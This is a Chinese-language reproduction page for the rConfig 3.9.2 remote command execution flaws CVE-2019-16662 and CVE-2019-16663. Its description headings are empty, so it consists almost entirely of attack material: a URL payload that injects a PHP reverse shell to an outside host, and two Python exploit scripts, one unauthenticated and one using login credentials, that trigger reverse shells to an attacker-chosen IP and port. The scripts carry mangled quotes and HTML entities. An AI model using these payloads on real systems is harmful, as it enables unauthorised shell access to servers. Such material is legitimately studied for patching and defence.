# （CVE-2019-16662）rConfig远程命令执行

> 原文：[https://www.zhihuifly.com/t/topic/3102](https://www.zhihuifly.com/t/topic/3102)

# （CVE-2019-16662）rConfig远程命令执行

## 一、漏洞简介

## 二、漏洞影响

## 三、复现过程

```
https://www.0-sec.org/install/lib/ajaxHandlers/ajaxServerSettingsChk.php?rootUname=`php -r '$sock=fsockopen("1.2.3.4",1234);exec("/bin/sh -i <&3 >&3 2>&3");'` 
```

![image](img/02b34608fe06569651d67d896a2c1d9e.png)

pyton脚本一

```
#!/usr/bin/python

# Exploit title: "rConfig v3.9.2 unauthenticated Remote Code Execution"

# Date: 18/09/2019

# Exploit Author: Askar (@mohammadaskar2)

# CVE : CVE-2019-16662

# Vendor Homepage: [https://rconfig.com/](https://rconfig.com/)

# Software link: [https://rconfig.com/download](https://rconfig.com/download)

# Version: v3.9.2

# Tested on: CentOS 7.7 / PHP 7.2.22

import requests

import sys

from urllib import quote

from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

if len(sys.argv) != 4:

print “[+] Usage : ./exploit.py target ip port”

exit()

target = sys.argv[1]

ip = sys.argv[2]

port = sys.argv[3]

payload = quote(’’’;php -r ‘$sock=fsockopen("{0}",{1});exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");’#’’’.format(ip, port))

install_path = target + “/install”

req = requests.get(install_path, verify=False)

if req.status_code == 404:

print “[-] Installation directory not found!”

print “[-] Exploitation failed !”

exit()

elif req.status_code == 200:

print “[+] Installation directory found!”

url_to_send = target + “/install/lib/ajaxHandlers/ajaxServerSettingsChk.php?rootUname=” + payload

print “[+] Triggering the payload”

print “[+] Check your listener !” `requests.get(url_to_send, verify=False)` 
```

![image](img/c5f2f3cc0649050524f632e26ece42bd.png)

python脚本二

```
#!/usr/bin/python

# Exploit title: "rConfig v3.9.2 Authenticated Remote Code Execution"

# Date: 18/09/2019

# Exploit Author: Askar (@mohammadaskar2)

# CVE : CVE-2019-16663

# Vendor Homepage: [https://rconfig.com/](https://rconfig.com/)

# Software link: [https://rconfig.com/download](https://rconfig.com/download)

# Version: v3.9.2

# Tested on: CentOS 7.7 / PHP 7.2.22

import requests

import sys

from urllib import quote

from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

if len(sys.argv) != 6:

print “[+] Usage : ./exploit.py target username password ip port”

exit()

target = sys.argv[1]

username = sys.argv[2]

password = sys.argv[3]

ip = sys.argv[4]

port = sys.argv[5]

request = requests.session()

login_info = {

“user”: username,

“pass”: password,

“sublogin”: 1

}

login_request = request.post(

target+"/lib/crud/userprocess.php",

login_info,

verify=False,

allow_redirects=True

)

dashboard_request = request.get(target+"/dashboard.php", allow_redirects=False)

if dashboard_request.status_code == 200:

print “[+] LoggedIn successfully”

payload = ‘’’""&amp;&amp;php -r ‘$sock=fsockopen("{0}",{1});exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");’#’’’.format(ip, port)

encoded_request = target+"/lib/crud/search.crud.php?searchTerm=anything&amp;catCommand={0}".format(quote(payload))

print “[+] triggering the payload”

print “[+] Check your listener !”

exploit_req = request.get(encoded_request) `elif dashboard_request.status_code == 302:

print “[-] Wrong credentials !”

exit()` 
```

![image](img/9a8b08d1e3267e33acec1bd75963c289.png)